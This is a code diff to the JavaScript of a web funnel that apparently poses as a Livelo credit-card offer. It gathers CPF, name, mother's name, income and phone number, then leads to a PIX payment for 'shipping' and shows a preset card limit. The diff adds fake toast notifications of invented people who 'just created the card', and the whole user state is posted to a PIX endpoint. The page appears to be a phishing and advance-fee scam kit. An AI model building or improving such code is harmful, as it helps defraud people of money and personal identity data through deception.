@@ -6,8 +6,14 @@
 // ============================================================================
 // ESTADO GLOBAL
 // ============================================================================
+let storedSession = null;
+try {
+  storedSession = localStorage.getItem('livelo_session');
+} catch (e) {}
+
 const STATE = {
-  sessionId: localStorage.getItem('livelo_session') || null,
+  sessionId: storedSession,
+
   cpf: '',
   nome: '',
   nome_mae: '',
@@ -24,7 +30,7 @@ const STATE = {
 
 if (!STATE.sessionId) {
   STATE.sessionId = 'ses_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-  localStorage.setItem('livelo_session', STATE.sessionId);
+  try { localStorage.setItem('livelo_session', STATE.sessionId); } catch(e) {}
 }
 
 // CAPTURE UTMS
@@ -199,10 +205,14 @@ const btnCpfOk = $id('btn-cpf-ok');
 if (btnCpfOk) {
   btnCpfOk.addEventListener('click', () => {
     // Update approved screen with name/cpf
-    if ($id('approved-name-display')) $id('approved-name-display').textContent = STATE.nome ? STATE.nome.split(' ')[0] : 'SEU NOME';
+    const firstName = STATE.nome ? STATE.nome.split(' ')[0] : 'SEU NOME';
+    if ($id('approved-name-display')) $id('approved-name-display').textContent = firstName;
     if ($id('summary-name')) $id('summary-name').textContent = STATE.nome ? STATE.nome.split(' ').slice(0,2).join(' ') : '—';
     if ($id('summary-end')) $id('summary-end').textContent = STATE.cpf || '—';
-    goToStep('priority');
+    if ($id('welcome-name-display')) $id('welcome-name-display').textContent = firstName;
+    if ($id('ola-name')) $id('ola-name').textContent = `Olá, ${firstName}!`;
+    if ($id('card-preview-name')) $id('card-preview-name').textContent = STATE.nome || 'SEU NOME';
+    goToStep('ola');
   });
 }
 
@@ -215,12 +225,12 @@ function selectIncome(btn, val) {
   STATE.renda = val;
   hideErr('income-error');
   // Auto-avança após breve feedback visual
-  setTimeout(() => goToStep('employment'), 260);
+  setTimeout(() => goToStep('restrictions'), 260);
 }
 
 function submitIncome() {
   if (!STATE.renda) return showErr('income-error', 'Selecione uma faixa de renda.');
-  goToStep('employment');
+  goToStep('restrictions');
 }
 
 function selectEmprego(btn) {
@@ -229,12 +239,12 @@ function selectEmprego(btn) {
   STATE.tipo_renda = btn.dataset.tipo;
   hideErr('emp-error');
   // Auto-avança
-  setTimeout(() => goToStep('motivo'), 260);
+  setTimeout(() => goToStep('income'), 260);
 }
 
 function submitEmprego() {
   if (!STATE.tipo_renda) return showErr('emp-error', 'Selecione sua situação profissional.');
-  goToStep('motivo');
+  goToStep('income');
 }
 
 function selectMotivo(btn) {
@@ -243,7 +253,7 @@ function selectMotivo(btn) {
   if (btn.dataset.motivo) STATE.motivo_credito = btn.dataset.motivo;
   hideErr('motivo-error');
   // Auto-avança
-  setTimeout(() => goToStep('billing'), 260);
+  setTimeout(() => startAnalysis(), 260);
 }
 
 function submitMotivo() {
@@ -406,7 +416,7 @@ function submitCardStyle() {
     body: JSON.stringify({ session_id: STATE.sessionId, color: STATE.color, style: STATE.style })
   }).catch(console.error);
   // Vai para tela de sucesso
-  goToStep('cep');
+  goToStep('manager');
   if(STATE.nome_completo) { 
       var n1 = document.getElementById('sum-nome'); if(n1) n1.innerText = STATE.nome_completo; 
       var n2 = document.getElementById('pix-nome'); if(n2) n2.innerText = STATE.nome_completo; 
@@ -420,7 +430,7 @@ function submitCardStyle() {
 }
 
 // Seleção de método de envio — carrega gerente e vai ao WhatsApp
-function selectShipping(type, price) {
+function selectShippingOld(type, price) {
   STATE.frete_tipo = type;
   STATE.frete_valor = price;
   // Atualiza valor exibido no PIX
@@ -485,8 +495,7 @@ async function submitWhatsapp() {
     
     if (data.ok) {
       STATE.managerWa = data.manager_wa || data.manager_whatsapp || '5511999999999';
-      $id('btn-wa-text').innerText = 'Gerando Pix...';
-      gerarPix();
+      goToStep('cep');
     } else {
       showErr('wa-error', data.error || 'Erro ao salvar. Tente novamente.');
       $id('btn-wa-text').innerText = 'Continuar';
@@ -609,7 +618,6 @@ function startPixPolling(paymentId) {
 }
 
 function showDone() {
-    // Configura link do zap
   let waNumber = window.APP_WA_NUM || STATE.managerWa || '5511999999999';
   waNumber = waNumber.replace(/\D/g, '');
   if (waNumber.length > 0 && !waNumber.startsWith('55')) waNumber = '55' + waNumber;
@@ -619,10 +627,54 @@ function showDone() {
   rawText = rawText.replace('{limite}', STATE.limite || 'R$ 4.500,00');
   
   const msg = encodeURIComponent(rawText);
-  
   $id('btn-contact-manager').href = `https://wa.me/${waNumber}?text=${msg}`;
   
-  goToStep('done');
+  // Render Custom Card info in Success Screen
+  const cv = $id('success-card-visual');
+  if(cv && window.CARD_TEMPLATES && window.CARD_TEMPLATES[STATE.color || 'classico']) {
+      cv.style.background = window.CARD_TEMPLATES[STATE.color || 'classico'].bg;
+  }
+  const cn = $id('success-card-name');
+  if(cn) cn.innerText = STATE.nome_completo || 'SEU NOME';
+  const cl = $id('success-card-limit');
+  if(cl) cl.innerText = STATE.limite || 'R$ 4.500,00';
+
+  goToStep('sucesso');
+  startFakeNotifications();
+}
+
+function startFakeNotifications() {
+  if(window._fakeToastInt) return;
+  const names = ["Ana", "Carlos", "Beatriz", "João", "Mariana", "Pedro", "Juliana", "Fernando", "Camila", "Rafael"];
+  const chars = ["S.", "M.", "P.", "L.", "R.", "C.", "G.", "A.", "F.", "V."];
+  
+  window._fakeToastInt = setInterval(() => {
+    if(Math.random() > 0.4) {
+      const n = names[Math.floor(Math.random()*names.length)];
+      const c = chars[Math.floor(Math.random()*chars.length)];
+      showFakeToast(`${n} ${c}`, `Acabou de criar o cartão.`);
+    }
+  }, 8000);
+}
+
+function showFakeToast(title, desc) {
+  const container = $id('fake-toast-container');
+  if(!container) return;
+  const el = document.createElement('div');
+  el.className = 'fake-toast';
+  el.innerHTML = `
+    <img src="https://ui-avatars.com/api/?name=${title.charAt(0)}&background=E5147A&color=fff&rounded=true" class="fake-toast-img">
+    <div class="fake-toast-content">
+      <div class="fake-toast-title">${title}</div>
+      <div class="fake-toast-desc">${desc}</div>
+    </div>
+  `;
+  container.appendChild(el);
+  setTimeout(() => el.classList.add('show'), 100);
+  setTimeout(() => {
+    el.classList.remove('show');
+    setTimeout(() => el.remove(), 400);
+  }, 4000);
 }
 
 // Modificação PIX Timer e API
@@ -630,29 +682,52 @@ const _oldGoTo = window.goToStep;
 if(_oldGoTo) {
     window.goToStep = function(stepId) {
         _oldGoTo(stepId);
+        
+        if(stepId === 'shipping-summary' || stepId === 'pix') {
+            if(STATE.nome_completo) {
+                const elSum = document.getElementById('sum-nome');
+                if(elSum) elSum.innerText = STATE.nome_completo;
+                const elPix = document.getElementById('pix-nome');
+                if(elPix) elPix.innerText = STATE.nome_completo;
+            }
+            if(STATE.cpf) {
+                const elPixCpf = document.getElementById('pix-cpf');
+                if(elPixCpf) elPixCpf.innerText = STATE.cpf;
+            }
+            if(STATE.celular) {
+                const elPixTel = document.getElementById('pix-tel');
+                if(elPixTel) elPixTel.innerText = STATE.celular;
+            }
+        }
+
         if(stepId === 'pix') {
-            fetch('/api/pix', {
+            fetch('/api/gerar-pix', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(STATE)
             })
             .then(r => r.json())
             .then(data => {
-                if(data.qr_code_base64) {
+                if(data.ok && data.qr_code_url) {
                     var qi = document.getElementById('qr-img');
                     if(qi) {
-                        qi.src = 'data:image/png;base64,' + data.qr_code_base64;
+                        if (data.qr_code_url.startsWith('data:')) {
+                            qi.src = data.qr_code_url;
+                        } else {
+                            // in case it's an external url
+                            qi.src = data.qr_code_url;
+                        }
                         qi.classList.remove('hidden');
                     }
                     var ql = document.getElementById('qr-loading');
                     if(ql) ql.classList.add('hidden');
                     var pt = document.getElementById('pix-code-text');
-                    if(pt) pt.value = data.pix_copia_cola;
+                    if(pt) pt.value = data.pix_code || data.pix_copia_cola;
                     
                     setInterval(() => {
-                        fetch('/api/check-payment/' + data.txid)
+                        fetch('/api/status-pix/' + data.payment_id)
                         .then(r => r.json())
-                        .then(pay => { if(pay.status === 'APPROVED') _oldGoTo('done'); }).catch(e=>e);
+                        .then(pay => { if(pay.status === 'approved') _oldGoTo('done'); }).catch(e=>e);
                     }, 4000);
                 }
             }).catch(e=>console.log(e));
@@ -730,7 +805,7 @@ function submitCep() {
   [$id('display-bairro'), $id('sum-bairro')].forEach(el => { if(el) el.innerText = fullBairro; });
   if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
   
-  goToStep('cep');
+  goToStep('shipping-methods');
 }
 
 // ============================================================================
@@ -814,12 +889,15 @@ function submitAddress() {
   if($id('sum-bairro')) $id('sum-bairro').innerText = fullBairro;
   if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
   
-  goToStep('shipping-method');
+  goToStep('shipping-methods');
 }
 
 function selectShipping(method, price) {
   STATE.shippingMethod = method;
   STATE.shippingPrice = price;
+  
+  if ($id('summary-card-name')) $id('summary-card-name').innerText = (STATE.nome || 'SEU NOME').toUpperCase();
+  
   goToStep('shipping-success');
 }
 
